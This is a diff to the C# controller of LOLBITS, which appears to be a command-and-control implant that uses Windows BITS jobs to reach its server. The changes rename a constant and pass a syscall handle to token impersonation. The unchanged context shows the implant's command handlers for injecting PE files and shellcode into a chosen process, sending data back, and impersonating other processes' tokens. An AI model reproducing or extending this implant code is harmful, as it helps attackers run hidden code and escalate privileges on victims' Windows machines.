@@ -14,7 +14,7 @@ namespace LOLBITS.Controlling
 {
     public class Controller
     {
-        private const string ContId = "7061796c676164";
+        private const string _contId = "7061796c676164";
         private readonly string _p;
         private string _id;
         private string _auth;
@@ -118,7 +118,7 @@ namespace LOLBITS.Controlling
                     case "inject_pe":
                         {
                             var fileP = _tempPath + @"\" + _id;
-                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
+                            var headers = "reqId: " + _auth + "\r\ncontid: " + _contId;
 
                             if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
@@ -156,7 +156,7 @@ namespace LOLBITS.Controlling
                     case "inject_shellcode":
                         {
                             var fileP = _tempPath + @"\" + _id;
-                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
+                            var headers = "reqId: " + _auth + "\r\ncontid: " + _contId;
                             var pid = -1;
                             if (file.Commands.Length >= 2)
                                 pid = int.Parse(file.Commands[1]);
@@ -204,7 +204,7 @@ namespace LOLBITS.Controlling
                     case "send":
                         {
                             var fileP = _tempPath + @"\" + _id;
-                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
+                            var headers = "reqId: " + _auth + "\r\ncontid: " + _contId;
 
                             if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
@@ -286,7 +286,7 @@ namespace LOLBITS.Controlling
                         {
                             try
                             {
-                                if (_tokenManager.Impersonate(int.Parse(file.Commands[1])))
+                                if (_tokenManager.Impersonate(int.Parse(file.Commands[1]), _sysCall))
                                     rps = "Impersonation achieved!\n";
                                 else
                                     rps = "ERR: Not enough privileges!\n";
